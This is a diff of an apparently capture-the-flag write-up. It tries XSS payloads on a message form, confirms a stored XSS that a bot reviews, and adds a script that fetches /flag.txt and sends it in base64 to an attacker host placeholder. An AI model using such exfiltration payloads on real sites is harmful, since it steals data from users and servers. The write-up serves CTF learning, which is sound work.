@@ -83,8 +83,8 @@ We can try a XSS with the textarea, </textarea><script>alert('SeraByte');</scrip
 
 But nothing again
 We try another XSS
-  <img src=x onerror=alert(1)>
-  "><img src=x onerror=alert(1)>
+  "<img src=x onerror=alert(1)>"
+  ""><img src=x onerror=alert(1)>"
 
 We don't have success
 What happend if we try a reverse shell? 
@@ -96,4 +96,33 @@ We run a listener
  We use the next script: "<img src="http://<IP>:443/test">"
 
 <img width="310" height="104" alt="image" src="https://github.com/user-attachments/assets/83aaa2aa-1183-4828-847c-64df5485c842" />
+
+Ok We recibe a non-shell, just are the request the server, like a curl
+
+<img width="441" height="221" alt="image" src="https://github.com/user-attachments/assets/f85b7107-4d27-4805-99a7-e9230b188f8b" />
+
+Now we are sure that it's a stored XSS, and there's a bot checking for the messages
+We need a script to do the bot get us the flag
+
+We can use the next
+"<script>
+fetch('/flag.txt')
+.then(r => r.text())
+.then(data => {
+  fetch('http://<IP>:443/?flag=' + btoa(data))
+})
+</script>"
+
+We start the listener, and submit the script 
+
+<img width="317" height="107" alt="image" src="https://github.com/user-attachments/assets/46f392e3-6fc8-4632-ba3b-2f946c6e4458" />
+
+Nice, we get the flag
+
+<img width="653" height="199" alt="image" src="https://github.com/user-attachments/assets/178dc705-6ab4-469f-b1a1-daf9eb2dbf13" />
+
+But it's in base64, that not problem, we can decode it 
+Using a simple command, like "echo <string-base64> | base64 -d" we can get the flag in plaintext
+
+<img width="675" height="84" alt="image" src="https://github.com/user-attachments/assets/0014af9e-0555-46a3-b405-826a52d1d922" />
 
